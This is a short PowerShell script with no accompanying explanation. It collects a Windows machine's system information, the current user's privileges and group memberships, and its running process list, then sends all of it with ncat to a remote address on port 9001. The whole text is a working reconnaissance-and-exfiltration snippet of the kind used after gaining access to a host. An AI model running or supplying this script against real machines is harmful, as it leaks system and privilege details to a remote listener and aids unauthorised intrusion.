$output = $(systeminfo)
$output += $(whoami /all)
$output += $(get-process)

$output | ncat 172.30.128.10 9001